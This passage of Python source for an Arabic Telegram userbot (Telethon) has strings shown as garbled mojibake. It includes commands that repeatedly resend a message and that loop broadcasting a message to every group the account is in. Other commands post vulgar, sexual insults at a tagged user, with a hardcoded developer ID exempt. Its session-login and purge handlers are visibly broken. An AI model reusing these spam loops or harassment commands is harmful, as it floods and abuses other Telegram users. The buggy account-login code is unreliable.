        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿ™ÿ≠ÿ™ŸàŸä ÿπŸÑŸâ ÿßŸÑŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ¨ÿØŸäÿØÿ©.**")
        return

    reply_message = await event.get_reply_message()

    if not reply_message.text:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ©.**")
        return

    new_message = reply_message.text

    import re
    used_vars = set(re.findall(r'{(\w+)}', new_message))
    invalid_vars = used_vars - allowed_vars

    if invalid_vars:
        await event.edit(
            f"**‚éô ÿ™Ÿàÿ¨ÿØ ŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ÿ∫Ÿäÿ± ŸÖÿ≥ŸÖŸàÿ≠ÿ© ŸÅŸä ÿßŸÑŸÉŸÑŸäÿ¥ÿ©:**\n"
            f"`{', '.join(invalid_vars)}`\n\n"
            "**ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ÿßŸÑŸÖÿ≥ŸÖŸàÿ≠ÿ©:**\n"
            f"`{', '.join(sorted(allowed_vars))}`"
        )
        return

    check_message = new_message
    await event.edit("**‚éô ÿ™ŸÖ ÿ™ÿ≠ÿØŸäÿ´ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑŸÅÿ≠ÿµ ÿ®ŸÜÿ¨ÿßÿ≠!**")

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ≥Ÿàÿ®ÿ± (\d+)$"))
async def final_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉÿ™ÿßÿ®ÿ© ÿµÿ≠Ÿäÿ≠ÿ© ÿßŸÑÿ±ÿ¨ÿßÿ° ÿßŸÑÿ™ÿßŸÉÿØ ŸÖŸÜ ÿßŸÑÿßŸÖÿ± ÿßŸàŸÑÿß.**", parse_mode="md")
    finalll = event.client
    global final
    final = True
    await final_supernshr(finalll, sleeptimet, message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ®ŸÑÿ¥ (\d+)$"))
async def repeat_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ±.**", parse_mode="md")

    global final
    final = True

    while final:
        await message.respond(message)
        await asyncio.sleep(seconds)
        
    
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ™ŸÜÿßŸàÿ® (\d+)$"))
async def rotate_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ±.**", parse_mode="md")

    global final
    final = True
    chats = await finalll.get_dialogs()
    groups = [chat for chat in chats if chat.is_group]
    num_groups = len(groups)
    current_group_index = 0

    while final:
        try:
            if message.media:
                await finalll.send_file(groups[current_group_index].id, message.media, caption=message.text)
            else:
                await finalll.send_message(groups[current_group_index].id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {groups[current_group_index].id}: {e}")

@client.on(events.NewMessage(pattern="\.gym$", outgoing=True))
async def gym(event):
    if event.fwd_from:
        return
    deq = deque(list("üèÉ‚Äçüèã‚Äçü§∏‚ÄçüèÉ‚Äçüèã‚Äçü§∏‚ÄçüèÉ‚Äçüèã‚Äçü§∏‚Äç"))
    for _ in range(48):
        await asyncio.sleep(0.1)
        await event.edit("".join(deq))
        deq.rotate(1)

phone_number_pending = None
phone_code_hash_pending = None
new_client = None

def get_session_filename(phone_number):
    return f'session_{phone_number}.pkl'

def load_or_create_session(phone_number, session_file=None):
    if session_file:
        try:
            with open(session_file, 'rb') as f:
                string = pickle.load(f)
            client = TelegramClient(StringSession(string), api_id, api_hash)
            print(f"\033[032mSession loaded from {session_file} successfully!")
            return client
        except FileNotFoundError:
            print(f"\033[031mSession file not found: {session_file}")
            return None
        except Exception as e:
            print(f"\033[031mError loading session from {session_file}: {e}")
            return None
    else:
        filename = get_session_filename(phone_number)
        try:
            with open(filename, 'rb') as f:
                string = pickle.load(f)
            client = TelegramClient(StringSession(string), api_id, api_hash)
            print(f"\033[032mSession for {phone_number} loaded successfully!")
            return client
        except FileNotFoundError:
            return None

def save_session(client, phone_number):
    session = client.session.save()
    with open(f"{phone_number}.session", "w") as file:
        file.write(session)
    print(f"\033[032mSession for {phone_number} saved successfully!")

accounts = {}

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ¨ŸÑÿ≥ÿ© (.+)$"))
async def add_session(event):
    global accounts
    phone_number = event.pattern_match.group(1)
    if phone_number not in accounts:
        accounts[phone_number] = {}
        client = load_or_create_session(phone_number)
        if client is None:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
        accounts[phone_number]['client'] = client
    try:
        sent_code = await accounts[phone_number]['client'].send_code_request(phone_number)
        await event.respond(f'**‚ñ™Ô∏é|ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÉŸàÿØ. ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÉŸàÿØ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ±ŸÖÿ≤ <ÿßŸÑŸÉŸàÿØ>` (ŸÖÿπ ŸÖÿ≥ÿßŸÅÿ© ÿ®ŸäŸÜ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ)**', parse_mode="markdown")
    except Exception as e:
        await event.respond(f'**‚ñ™Ô∏é|ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÉŸàÿØ: {e}**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ±ŸÖÿ≤ (.+)$"))
async def add_code(event):
    global accounts
    phone_number = None
    for account in accounts:
        if accounts[account]['client'].is_user_authorized():
            phone_number = account
            break
    if phone_number is not None:
        code = event.pattern_match.group(1).replace(" ", "")
        try:
            await accounts[phone_number]['client'].sign_in(phone_number, code)
            save_session(accounts[phone_number]['client'], phone_number)
            await event.respond(f'**‚ñ™Ô∏é|ÿ™ŸÖÿ™ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ© ŸÑÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ {phone_number} ÿ®ŸÜÿ¨ÿßÿ≠‚úÖÔ∏è**', parse_mode="markdown")
        except SessionPasswordNeededError:
            await event.respond('**‚ñ™Ô∏é|Ÿäÿ™ÿ∑ŸÑÿ® Ÿáÿ∞ÿß ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ. ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ± ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ™ÿ≠ŸÇŸÇ <ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±>`**', parse_mode="markdown")
        except Exception as e:
            await event.respond(f'**‚ñ™Ô∏é|ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ©: {e}**', parse_mode="markdown")
    else:
        await event.respond('**‚ñ™Ô∏é|ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ÿ£ŸàŸÑÿßŸã ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ¨ŸÑÿ≥ÿ© <ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ>`**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ™ÿ≠ŸÇŸÇ (.+)$"))
async def add_password(event):
    global accounts
    phone_number = event.pattern_match.group(1)
    if phone_number in accounts:
        password = event.pattern_match.group(1)
        try:
            await accounts[phone_number]['client'].sign_in(phone_number, password=password)
            save_session(accounts[phone_number]['client'], phone_number)
            await event.respond(f'**‚ñ™Ô∏é|ÿ™ŸÖÿ™ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ© ŸÑÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ {phone_number} ÿ®ŸÜÿ¨ÿßÿ≠‚úÖÔ∏è**', parse_mode="markdown")
        except Exception as e:
            await event.respond(f'**‚ñ™Ô∏é|ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ©: {e}**', parse_mode="markdown")
    else:
        await event.respond('**‚ñ™Ô∏é|ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ÿ£ŸàŸÑÿßŸã ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ¨ŸÑÿ≥ÿ© <ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ>`**', parse_mode="markdown")
        
@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ∑ÿ®ÿßÿπÿ© (.+)'))
async def ple(event):
    orig_text = event.pattern_match.group(1)
    text = orig_text
    pb = ""
    typing_symbol = "‚ñí"
    while(pb != orig_text):
        try:
            await event.edit(pb + typing_symbol)
            time.sleep(0.05)
            pb += text[0]
            text = text[1:]
            await event.edit(pb)
            time.sleep(0.05)
        except Exception as e:
            print(e)

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ¥ÿ±ÿ∑ÿ©$"))
async def police(event):
    if event.fwd_from:
        return
    animation_ttl = range(0, 12)
    await event.edit("Police")
    animation_chars = [
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        " **Police iz Here**",
    ]
    for i in animation_ttl:
        await asyncio.sleep(0.5)
        await event.edit(animation_chars[i % 12])

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿ™ÿ¥ŸÅŸäÿ±$'))
async def runb64(event):
    await event.edit("wait...")
    options = event.message.raw_text.split()
    selectsecretmessage = await event.get_reply_message()
    try:
        if options[1] == "en":
            secretmessage = selectsecretmessage.message
            secretmessagebytes = secretmessage.encode("ascii")
            encodesecretmessage = base64.b64encode(secretmessagebytes)
            encodesecretmessagebytes = encodesecretmessage.decode("ascii")
            await event.edit("ÿßŸÑÿ™ÿ¥ŸÅŸäÿ±...")
            sleep(2)
            await event.edit(f"{encodesecretmessagebytes}")
        elif options[1] == "de":
            secretkey = selectsecretmessage.message
            secretkeybytes = secretkey.encode("ascii")
            decodesecretkey = base64.b64decode(secretkeybytes)
            decodesecretkeybytes = decodesecretkey.decode("ascii")
            await event.edit("ŸÅŸÉ ÿßŸÑÿ™ÿ¥ŸÅŸäÿ±...")
            sleep(2)
            await event.edit(f"ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖŸÅŸÉŸÉÿ©: {decodesecretkeybytes}")
        else:
            await event.edit("ÿÆÿ∑ÿ£!!!")
    except IndexError:
        await event.edit("ŸÑŸÉÿ™ÿßÿ®ÿ© ÿ™ÿ±ŸÖŸäÿ≤ ÿßŸà ŸÅŸÉ ÿßŸÑÿ™ÿ±ŸÖŸäÿ≤ ÿßŸÉÿ™ÿ® .ÿ™ÿ¥ŸÅŸäÿ± ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
    except:
        await event.edit("ÿ®ÿπÿ∂ ÿßŸÑÿßÿÆÿ∑ÿßÿ°!!!") 

@client.on(events.NewMessage(pattern="^/purge"))
async def purge(event):
    chat = event.chat_id
    msgs = []

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.edit("ÿßŸÜŸÄÿ™ ŸÑÿ≥ŸÄÿ™ ÿßÿØŸÖŸÄŸÜ!")
        return

    msg = await event.get_reply_message()
    if not msg:
        await event.edit("ŸÇŸÄŸÖ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™ŸÄŸä ÿ™ÿ±ŸäŸÄÿØ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸÄŸä ÿ™ÿ≠ŸÄÿ™Ÿáÿß.")
        return

    try:
        msg_id = msg.id
        count = 0
        to_delete = event.message.id - 1
        msgs.append(event.reply_to_msg_id)
        for m_id in range(to_delete, msg_id - 1, -1):
            msgs.append(m_id)
            count += 1
            if len(msgs) == 100:
                msgs = []

        del_res = await event.client(
            event.chat_id, f"ÿ™ŸÜÿ∏ŸäŸÅ ÿ≥ÿ±Ÿäÿπ {count} ÿ±ÿ≥ÿßŸÑÿ© ."
        )

        await asyncio.sleep(4)
        await del_res.delete()

    except MessageDeleteForbiddenError:
        text = "ÿÆŸÄÿ∑ÿ£ ŸÅŸä ÿ≠ŸÄÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ.\n"
        text += "ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑŸá ŸÇÿØ ÿ™ŸÉŸàŸÜ ŸÇÿØŸäŸÖÿ© ÿßŸà ŸÑŸäÿ≥ŸÄÿ™ ŸÑÿØŸäŸÄŸÉ ÿµŸÑÿßÿ≠ŸÄŸäÿßÿ™ ÿßŸÑŸÄÿ≠ÿ∞ŸÅ"
        del_res = await event.reply(text, parse_mode="md")
        await asyncio.sleep(5)
        await del_res.delete()


@client.on(events.NewMessage(pattern="^/del$"))
async def delete_msg(event):

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.edit("ÿßŸÜŸÄÿ™ ŸÑŸÄÿ≥ÿ™ ÿßÿØŸÖŸÄŸÜ!")
        return

    chat = event.chat_id
    msg = await event.get_reply_message()
    if not msg:
        await event.edit("ŸÇŸÄŸÖ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™ŸÄŸä ÿ™ÿ±ŸäŸÄÿØ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸÄŸä ÿ™ÿ≠ŸÄÿ™Ÿáÿß")
        return
    to_delete = event.message
    chat = await event.get_input_chat()
    rm = [msg, to_delete]

@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ÿ¨ŸÑÿ®(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    
    if user.id == 6383191007:
        await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
        return
        
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id})\n**‚éôÔ∏ô ÿ™ŸÖ ÿ±ŸÅÿπŸá ÿ¨ŸÑÿ® üê∂ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention}\n**‚éôÔ∏ô ÿÆŸÑŸäŸá ÿÆŸÑŸá ŸäŸÜÿ®ÿ≠ üòÇ**")

@client.on(events.NewMessage(pattern="ÿ≤Ÿàÿßÿ¨(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    
    if user.id == 6383191007:
        await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
        return
        
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    await event.edit(f"‚éôÔ∏ô ŸÑŸÇÿØ ÿ™ŸÖ ÿ≤Ÿàÿßÿ¨ŸÉ/ÿ¨ ŸÖŸÜ üíç\n‚éôÔ∏ô ÿßŸÑŸÅ ÿßŸÑŸÅ ŸÖÿ®ÿ±ŸàŸÉ! ÿßŸÑÿ¢ŸÜ ŸäŸÖŸÉŸÜŸÉ ÿ£ÿÆÿ∞ ÿ±ÿßÿ≠ÿ™ŸÉ üòç")
    
@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ÿßÿ®ŸÜ ŸÇÿ≠ÿ®ÿ©(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    
    if user.id == 6383191007:
        await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
        return
        
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id})\n**‚éôÔ∏ô ÿ™ŸÖ ÿ±ŸÅÿπŸá ÿßÿ®ŸÜ ŸÇÿ≠ÿ®ÿ© üñï ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention}\n**‚éôÔ∏ô ÿÆŸÑŸäŸá Ÿäÿ±ÿ∂ÿπ ŸÖŸÜ ÿ≤ÿ®ŸÉ üòÇ**")    
    
@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ŸÖÿ±ÿ™Ÿä(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    
    if user.id == 6383191007:
        await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
        return
        
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"üöª **‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ => ‚Ä¢** [{JoKeRUB}](tg://user?id={user.id})\n‚òëÔ∏è **‚éôÔ∏ô ÿ™ŸÖ ÿ±ŸÅÿπŸáÿß ŸÖÿ±ÿ™ŸÉ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention} üë∞üèº‚Äç‚ôÄÔ∏è.\n**‚éôÔ∏ô ŸäŸÑÿß ÿ≠ÿ®Ÿäÿ®Ÿä ÿßŸÖÿ¥Ÿä ŸÜÿÆŸÑŸÅ ÿ®Ÿäÿ®Ÿä üë∂üèªü§§**")

@client.on(events.NewMessage(pattern=".ŸÉÿ™ÿßÿ®ÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßŸÑŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸàŸáŸÖŸäÿ© ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(t)

HuRe_Bosa = ["ÿ±Ÿàÿ≠ ŸÑÿπŸÜÿØ ÿßŸÑŸÖÿ∑Ÿàÿ± ŸàŸÇŸàŸÑ ŸÑŸá", "ÿßŸäÿπ ŸÖŸÇÿ±ŸÅ", "ŸáŸÖŸÖŸÖŸÖŸÖŸÖ"]

@client.on(events.NewMessage(pattern=".ÿ®Ÿàÿ≥ÿ©$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_Bosa))

DevJoker = [6383191007]

HuRe_5erok = [
    "** ‚ÄéŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÇÿ∂ÿßÿ° ŸäŸàŸÖ ŸÉÿßŸÖŸÑ ŸÖÿπ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿä ÿßŸÑÿ∞Ÿä ÿ™ÿ¥ÿ¨ÿπŸá ÿ£Ÿà ŸÜÿ¨ŸÖ ÿßŸÑÿ≥ŸäŸÜŸÖÿß ÿßŸÑÿ∞Ÿä ÿ™ÿ≠ÿ®Ÿáÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ£ÿ≥ÿ¶ŸÑÿ© ŸÖÿ≠ÿ±ÿ¨ÿ© ÿ£ÿ≥ÿ¶ŸÑÿ© ÿµÿ±ÿßÿ≠ÿ© ŸÖÿßÿ∞ÿß ÿ≥ÿ™ÿÆÿ™ÿßÿ±ÿü **",
    "** ŸáŸÑ ŸÉÿ∞ÿ®ÿ™ ÿπŸÑŸâ ŸàÿßŸÑÿØŸäŸÉ ŸÖŸÜ ŸÇÿ®ŸÑ..ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÖŸÉÿßŸÜŸäÿ© ÿ™Ÿàÿßÿ¨ÿØŸÉ ŸÅŸä ÿßŸÑŸÅÿ∂ÿßÿ° Ÿàÿ®ŸäŸÜ ÿ•ŸÖŸÉÿßŸÜŸäÿ© ÿ™Ÿàÿßÿ¨ÿØŸÉ ŸÅŸä ÿßŸÑÿ®ÿ≠ÿ±ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ÿ≥ÿ™ÿßÿ∞ ÿßŸÑŸÑÿ∫ÿ©  Ÿäÿ© ÿ£Ÿà ÿ£ÿ≥ÿ™ÿßÿ∞ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿäÿßÿ™ÿü **",
    "** ÿ™ÿ≠ÿ≥ ÿßŸÜŸÉ ŸÖÿ≠ÿ∏Ÿàÿ∏ ÿ®ÿßŸÑÿßÿ¥ÿÆÿßÿµ ÿßŸÑŸä ÿ≠ŸàŸÑŸÉ ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÖÿ¥ÿßŸáÿØÿ© ŸÉÿ±ÿ© ÿßŸÑŸÇÿØŸÖ ÿ£Ÿà ŸÖÿ™ÿßÿ®ÿπÿ© ÿßŸÑÿ£ÿÆÿ®ÿßÿ±ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿßŸÑÿ™Ÿä ÿ™ŸÅÿ∂ŸÑŸáÿß ŸÑŸÉŸÜ ŸÖÿπ ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿ¥ÿ© ŸÖŸÜ ÿßŸÑŸÖŸÑÿ≠ ŸàÿßŸÑŸÇŸÑŸäŸÑ ŸÖŸÜ ÿπÿµŸäÿ± ÿßŸÑŸÑŸäŸÖŸàŸÜ ÿ•ŸÑŸäŸáÿß ÿ£Ÿà ÿ™ŸÜÿßŸàŸÑ ŸÑŸäŸÖŸàŸÜÿ© ŸÉÿßŸÖŸÑÿ© ŸÉÿ®Ÿäÿ±ÿ© ÿßŸÑÿ≠ÿ¨ŸÖÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ£ŸÜ ÿ™ÿπŸäÿ¥ ŸÇÿµÿ© ŸÅŸäŸÑŸÖ ŸáŸÑ ÿ™ÿÆÿ™ÿßÿ± ÿßŸÑÿ£ŸÉÿ¥ŸÜ ÿ£Ÿà ÿßŸÑŸÉŸàŸÖŸäÿØŸäÿßÿü **",
    "** ŸÑŸà ŸÉŸÜÿ™ ÿ¥ÿÆÿµ ÿ¢ÿÆÿ± ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿ®ŸÇÿßÿ° ŸÖÿπŸÉ ÿ£ŸÖ ÿ£ŸÜŸÉ ÿ≥ÿ™ÿ®ÿ™ÿπÿØ ÿπŸÜ ŸÜŸÅÿ≥ŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑÿ£ÿÆÿ®ÿßÿ± ÿßŸÑÿ¨ŸäÿØÿ© ÿ£ŸàŸÑŸãÿß ÿ£Ÿà ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑÿ£ÿÆÿ®ÿßÿ± ÿßŸÑÿ≥Ÿäÿ¶ÿ© ÿ£ŸàŸÑŸãÿßÿü **",
